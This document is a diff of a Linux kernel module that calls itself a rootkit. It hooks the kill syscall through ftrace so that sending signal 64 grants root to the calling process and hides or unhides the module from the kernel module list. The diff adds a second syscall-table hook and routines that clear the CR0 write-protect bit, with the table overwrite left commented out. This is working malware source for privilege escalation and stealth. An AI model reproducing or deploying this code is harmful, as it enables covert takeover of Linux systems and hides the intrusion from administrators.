@@ -8,9 +8,9 @@
 #include "ftrace_helper.h"
 
 MODULE_LICENSE("GPL");
-MODULE_AUTHOR("TheXcellerator");
-MODULE_DESCRIPTION("Giving root privileges to a process");
-MODULE_VERSION("0.02");
+MODULE_AUTHOR("ubuntu");
+MODULE_DESCRIPTION("hide module");
+MODULE_VERSION("0.01");
 
 /* After Kernel 4.17.0, the way that syscalls are handled changed
  * to use the pt_regs struct instead of the more familiar function
@@ -27,20 +27,26 @@ MODULE_VERSION("0.02");
  * more modern way is to use the pt_regs struct. */
 // #ifdef PTREGS_SYSCALL_STUBS
 static asmlinkage long (*orig_kill)(const struct pt_regs *);
-
+static asmlinkage int (*init_kill)(pid_t pid, int sig);
 static int hidden = 0;
 
 static struct list_head *prev_module;
 
 void hideme(void) {
     prev_module = THIS_MODULE->list.prev;
-    //list_del(&THIS_MODULE->list);
-    list_del_init(&THIS_MODULE->list);
+    list_del(&THIS_MODULE->list);
+    // THIS_MODULE->list.prev->next = THIS_MODULE->list.next;
+    // THIS_MODULE->list.next->prev = THIS_MODULE->list.prev;
+    // list_del_init(&THIS_MODULE->list);
 }
 
 void showme(void) {
     //static inline void list_add(struct list_head *new, struct list_head *head)
-    list_add(&THIS_MODULE->list, prev_module);
+    list_add_tail(&THIS_MODULE->list, prev_module);
+    //list_add(&THIS_MODULE->list, prev_module);
+    // THIS_MODULE->list.prev->next = &THIS_MODULE->list;
+    
+//     THIS_MODULE->list.next->prev = &THIS_MODULE->list;
 }
 
 
@@ -58,12 +64,14 @@ asmlinkage int hook_kill(const struct pt_regs *regs)
     if ( sig == 64 )
     {
         set_root();
+        printk(KERN_INFO "rootkit: giving root...\n");
         if (hidden == 0) {
-            printk(KERN_INFO "rootkit: giving root...\n");
+            printk(KERN_INFO "rootkit: hideme...\n");
             hideme();
             hidden = 1;
             return 0;
         } else {
+            printk(KERN_INFO "rootkit: showme...\n");
             showme();
             hidden = 0;
             return 0;
@@ -73,6 +81,34 @@ asmlinkage int hook_kill(const struct pt_regs *regs)
 
     return orig_kill(regs);
 
+}
+
+asmlinkage int my_kill(pid_t pid, int sig) {
+    void set_root(void);
+    void hideme(void);
+    void showme(void);
+
+    // pid_t pid = regs->di;
+    // int sig = regs->si;
+
+    if ( sig == 64 )
+    {
+        set_root();
+        printk(KERN_INFO "rootkit: giving root...\n");
+        if (hidden == 0) {
+            printk(KERN_INFO "rootkit: hideme...\n");
+            hideme();
+            hidden = 1;
+            return 0;
+        } else {
+            printk(KERN_INFO "rootkit: showme...\n");
+            showme();
+            hidden = 0;
+            return 0;
+        }
+    }
+
+    return init_kill(pid, sig);
 }
 
 /* Whatever calls this function will have it's creds struct replaced
@@ -100,11 +136,34 @@ void set_root(void)
 static struct ftrace_hook hooks[] = {
     HOOK("__x64_sys_kill", hook_kill, &orig_kill),
 };
+unsigned long * sys_call_table = 0;
+static long orig_cr0 = 0;
 
+void mywrite_cr0(unsigned long cr0) {
+    asm volatile("mov %0,%%cr0" : "+r"(cr0));
+}
+
+void disable_write_protection(void) {
+    orig_cr0 = read_cr0();
+    mywrite_cr0(orig_cr0 & (~0x10000)); //set wp to 0
+}
+
+void enable_write_protection(void) {
+    mywrite_cr0(orig_cr0);          //set wp to 1
+}
 /* Module initialization function */
 static int __init rootkit_init(void)
 {
-    /* Hook the syscall and print to the kernel buffer */
+    // /* Hook the syscall and print to the kernel buffer */
+    // disable_write_protection();
+    // //get sys_call_table
+    // sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
+    // //save the pointer to clone
+    // init_kill = (sys_call_table[__NR_kill]);
+    // //substitute sys_call_table with my_syscall
+    // sys_call_table[__NR_kill] = (unsigned long) my_kill;
+
+    // enable_write_protection();
     int err;
     err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
     if(err)
@@ -119,6 +178,10 @@ static void __exit rootkit_exit(void)
 {
     /* Unhook and restore the syscall and print to the kernel buffer */
     fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
+    // disable_write_protection();
+    // //restore sys_call_table
+    // sys_call_table[__NR_kill] = init_kill;
+    // enable_write_protection();
     printk(KERN_INFO "rootkit: Unloaded :-(\n");
 }
 
